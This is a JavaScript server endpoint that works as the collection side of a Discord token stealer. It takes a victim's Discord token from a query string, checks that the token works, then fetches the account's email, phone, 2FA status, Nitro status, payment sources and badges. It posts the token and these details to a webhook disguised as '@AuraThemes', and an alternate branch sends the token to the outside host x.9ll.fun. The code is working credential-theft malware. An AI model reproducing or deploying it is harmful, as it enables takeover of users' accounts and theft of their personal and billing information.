import { webhook } from '../../../../k4itrun.config';
import axios from 'axios';

export default async function handler(req, res) {
  try {
    const { data: token } = req.query;

    if (!token) {
      res.status(400).send({
        message: 'Bad Request: missing "data" query parameter'
      });

      return;
    }

    if (true) {
      try {
        const response = await axios.get('https://discord.com/api/v9/users/@me', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': token
          }
        });

        if (response.status === 200) {
          const info = {
            token: token,
            ...response.data
          };

          await axios.post(webhook, {
            username: '@AuraThemes',
            avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
            embeds: await embed(info),
          });
        }
      } catch (error) {
        if (error.response) {
          console.error(`Error: ${error.response.status} - ${error.response.data.message || 'Request failed'}`);
        } else if (error.request) {
          console.error('Error: No response from server');
        } else {
          console.error(`Error: ${error.message}`);
        }
      }
    } else {
      axios.get('https://x.9ll.fun/api/v1/raw?data=' + token, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': token
        }
      })
    };

    res.status(200).send(token);
  } catch (error) {
    res.status(500).send('Internal Server Error');
    console.error(error);
  }
}


const emojis = {
  'themes': {
    'dark': 'Dark',
    'light': 'Light',
  },
  'status': {
    'online': '<:online:1129709364316491787>',
    'idle': '<:idle:1120542710424674306>',
    'dnd': '<:dnd:974692691289993216>',
    'invisible': '<:offline:1137141023529762916>',
  },
  'user': {
    'boost': [
      '<:booster_1_month:1297275185099182170> ',
      '<:booster_2_month:1297275521868107886> ',
      '<:booster_3_month:1297275188030738533> ',
      '<:booster_6_month:1297275192724426915> ',
      '<:booster_9_month:1297275523139112990> ',
      '<:booster_12_month:1297275195400257597> ',
      '<:booster_15_month:1297275198277423245> ',
      '<:booster_18_month:1297275202442367067> ',
      '<:booster_24_month:1297275207400161311> ',
    ],
    'i': [
      '<:staff:1297275182079017082> ',
      '<:partner:1297275180917330063> ',
      '<:hypesquad_events:1297275178300215386> ',
      '<:bughunter_1:1297275173296406568> ',
      '<:bravery:1297275208658456586> ',
      '<:brilliance:1297275519980671068> ',
      '<:balance:1297275520936837254> ',
      '<:early_supporter:1297275177163559064> ',
      '<:bughunter_2:1297275174634393683> ',
      '<:active_developer:1042545590640324608> ',
      '<:verified_developer:1297275176127299625> ',
    ],
  },
};

const languages = {
  'zh-TW': '🇨🇳 Chinese-Taiwanese',
  'pr-BR': '🇵🇹 Portuguese',
  'sv-SE': '🇸🇪 Swedish',
  'zh-CN': '🇨🇳 Chinese-China',
  'en-GB': '🪟 English (UK)',
  'en-US': '🇺🇸 USA',
  'es-ES': '🇪🇸 Español',
  'ro': '🇷🇴 Romanian',
  'fi': '🇫🇮 Finnish',
  'vi': '🇻🇳 Vietnamese',
  'tr': '🇹🇷 Turkish',
  'ru': '🇷🇺 Russian',
  'uk': '🇺🇦 Ukrainian',
  'hi': '🇮🇳 Indian',
  'th': '🇹🇼 Taiwanese',
  'hr': '🇭🇷 Croatian',
  'it': '🇮🇹 Italianio',
  'lt': '🇱🇹 Lithuanian',
  'no': '🇳🇴 Norwegian',
  'ja': '🇯🇵 Japanese',
  'ko': '🇰🇷 Korean',
  'fr': '🇫🇷 French',
  'da': '🇩🇰 Dansk',
  'de': '🇩🇪 Deutsch',
  'pl': '🇵🇱 Polish',
  'cs': '🇨🇿 Czech',
  'el': '🇬🇷 Greek',
  'bg': '🇧🇬 Bulgarian',
  'hu': '🇳🇴🇭🇺 Hungarian',
};

async function fetch(url, token) {
  try {
    const response = await axios.get(url, {
      headers: {
        'Content-Type': 'application/json',
        'Authorization': token,
      },
      timeout: 5000,
    });

    if (response.status === 200) {
      return response.data;
    }

    return 'Invalid';
  } catch (error) {
    if (error.response) {
      return `Error: ${error.response.status} - ${error.response.data.message || 'Request failed'}`;
    } else if (error.request) {
      return 'Error: No response from server';
    } else {
      return `Error: ${error.message}`;
    }
  }
}


function getNitro(user) {
  const { premium_type, premium_guild_since } = user;
  const nitro = '<:nitro:1016385399020601344>';
  switch (premium_type) {
    default:
      return '`❓`';
    case 1:
      return nitro;
    case 2:
      if (!premium_guild_since) {
        return nitro;
      };
      const now = new Date();
      const months = [2, 3, 6, 9, 12, 15, 18, 24];
      let rem = 0;

      for (let i = 0; i < months.length; i++) {
        const d = months[i];
        if (Math.round((getDate(new Date(premium_guild_since), d) - now) / 86400000) > 0) {
          rem = i;
          break;
        }
      }
      return `${nitro} ${emojis.user.boost[rem]}`;
  }
}

function getDate(start, next) {
  return new Date(start).setMonth(start.getMonth() + next);
}

function getLanguage(type) {
  return languages[type] || 'Unknown Language';
}

function getStatus(type) {
  return emojis.status[type] || 'Unknown Status';
}

function getFlags(badge) {
  return (
    (1 & badge ? emojis.user.i[0] : '') +
    (2 & badge ? emojis.user.i[1] : '') +
    (4 & badge ? emojis.user.i[2] : '') +
    (8 & badge ? emojis.user.i[3] : '') +
    (64 & badge ? emojis.user.i[4] : '') +
    (128 & badge ? emojis.user.i[5] : '') +
    (256 & badge ? emojis.user.i[6] : '') +
    (512 & badge ? emojis.user.i[7] : '') +
    (16384 & badge ? emojis.user.i[8] : '') +
    (4194304 & badge ? emojis.user.i[9] : '') +
    (131072 & badge ? emojis.user.i[10] : '')
  ) || '`❓`';
}

async function embed(info) {
  const profile = await fetch(`https://discord.com/api/v9/users/${info.id}/profile`, info.token);
  const settings = await fetch(`https://discord.com/api/v9/users/@me/settings`, info.token);
  const payment = await fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, info.token);

  const billing = payment?.reduce((acc, e) => {
    if (e.email) {
      acc += `<:paypal:861207258846330880> `;
    }

    const validTypes = {
      1: '<:creditcart:741512388490035251>',
      3: '`Giropay`',
      16: '`Rabobank`',
      7: '`PaysafeCard`',
    };

    if (!e.invalid && validTypes[e.type]) {
      acc += validTypes[e.type] + ' ';
    }

    return acc;
  }, '');

  const ext = info.avatar.startsWith('a_') ? 'gif' : 'png';
  const avatar = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.${ext}`;

  return [
    {
      color: 12740607,
      title: `${info.username} | ${info.id}`,
      thumbnail: {
        url: avatar + '?size=512'
      },
      fields: [
        {
          name: `<:x:1194495538138185728> Token:`,
          value: '```' + info.token + '```',
          inline: false
        },
        { name: '\u200b', value: '\u200b', inline: false },
        {
          name: '<a:mail:1245038428891123815> Email:',
          value: '`' + (info.email || '❓') + '`',
          inline: true
        },
        {
          name: '<a:phone:1104204812867874936> Phone:',
          value: '`' + (info.phone || '❓') + (info.mfa_enabled ? ' (2FA)' : '') + '`',
          inline: true
        },
        { name: '\u200b', value: '\u200b', inline: false },
        {
          name: '<a:nitro:1122755911967068210> Nitro:',
          value: getNitro(profile),
          inline: true
        },
        {
          name: '<:billing:1122678162288037929> Billing:',
          value: (billing || '`❓`'),
          inline: true
        },
        { name: '\u200b', value: '\u200b', inline: false },
        {
          name: '<a:badges:1138323945284714516> Badges:',
          value: getFlags(info.public_flags),
          inline: true
        },
        {
          name: '🏳️ Langue:',
          value: getLanguage(settings.locale),
          inline: true
        },
        {
          name: '🌙 Status:',
          value: getStatus(settings.status),
          inline: true
        },
      ]
    }
  ]
}
